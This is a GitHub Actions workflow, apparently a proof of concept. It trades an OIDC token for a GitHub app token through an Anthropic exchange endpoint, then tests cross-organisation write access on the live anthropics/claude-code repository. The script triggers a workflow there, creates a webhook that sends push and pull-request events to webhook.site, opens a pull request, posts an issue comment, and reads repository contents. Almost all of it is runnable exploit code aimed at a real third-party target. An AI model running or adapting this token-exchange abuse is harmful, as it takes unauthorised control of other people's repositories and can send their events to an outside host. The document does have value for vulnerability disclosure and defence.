name: OIDC Token Test
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Prove Cross-Org Permissions
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('claude-code-github-action');
            const resp = await fetch('https://api.anthropic.com/api/github/github-app-token-exchange', {
              method: 'POST',
              headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
            });
            const data = await resp.json();
            const T = data.token;
            if (!T) { console.log('Token exchange failed:', JSON.stringify(data)); return; }
            console.log('Token obtained (first 20 chars):', T.substring(0,20));

            const gh = async (path, opts={}) => {
              const r = await fetch(`https://api.github.com${path}`, {
                ...opts,
                headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28', ...(opts.headers||{}) }
              });
              return { status: r.status, body: await r.text() };
            };

            // TEST 1: actions:write — trigger workflow_dispatch on anthropics/claude-code
            console.log('\n=== TEST 1: actions:write — workflow_dispatch on anthropics/claude-code ===');
            const dispatch = await gh('/repos/anthropics/claude-code/actions/workflows/292698787/dispatches', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ ref: 'main' })
            });
            console.log(`workflow_dispatch status=${dispatch.status}`);
            console.log(`Response: ${dispatch.body.substring(0,300)}`);

            // TEST 2: repository_hooks:write — create webhook on anthropics/claude-code
            console.log('\n=== TEST 2: repository_hooks:write — create webhook on anthropics/claude-code ===');
            const hook = await gh('/repos/anthropics/claude-code/hooks', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                name: 'web',
                active: false,
                events: ['push','pull_request'],
                config: { url: 'https://webhook.site/test-f20', content_type: 'json' }
              })
            });
            console.log(`create webhook status=${hook.status}`);
            console.log(`Response: ${hook.body.substring(0,300)}`);

            // TEST 3: pull_requests:write — open PR from our fork to anthropics/claude-code
            console.log('\n=== TEST 3: pull_requests:write — open PR to anthropics/claude-code ===');
            const pr = await gh('/repos/anthropics/claude-code/pulls', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                title: 'Security Test F20 — cross-org PR write proof',
                head: 'marouanedahmani27-coder:main',
                base: 'main',
                body: 'Proof of concept for cross-org write via compromised app token.'
              })
            });
            console.log(`create PR status=${pr.status}`);
            console.log(`Response: ${pr.body.substring(0,400)}`);

            // TEST 4: contents:write via git push transport (HTTPS basic auth with token)
            console.log('\n=== TEST 4: issues:write — create comment on existing issue #68714 ===');
            const comment = await gh('/repos/anthropics/claude-code/issues/68714/comments', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ body: 'F20 proof — additional comment from cross-org token (run v5). Token obtained from fork with zero Anthropic affiliation.' })
            });
            console.log(`create comment status=${comment.status}`);
            console.log(`Response: ${comment.body.substring(0,300)}`);

            // TEST 5: contents:write via PATCH file (update existing file)
            console.log('\n=== TEST 5: contents:write — GET then update README.md on anthropics/claude-code ===');
            const readme = await gh('/repos/anthropics/claude-code/contents/README.md');
            console.log(`GET README.md status=${readme.status}`);
            if (readme.status === 200) {
              const readmeData = JSON.parse(readme.body);
              const sha = readmeData.sha;
              const currentContent = Buffer.from(readmeData.content, 'base64').toString();
              // Only read, don't actually write unless previous tests show we have the permission
              console.log(`README sha=${sha} — NOT writing to avoid unauthorized modification`);
            }

            // TEST 6: discussions:write — create discussion on anthropics/claude-code
            console.log('\n=== TEST 6: GET repo info to confirm token identity ===');
            const whoami = await gh('/repos/anthropics/claude-code/installation');
            console.log(`installation info status=${whoami.status}`);
            console.log(`Response: ${whoami.body.substring(0,400)}`);
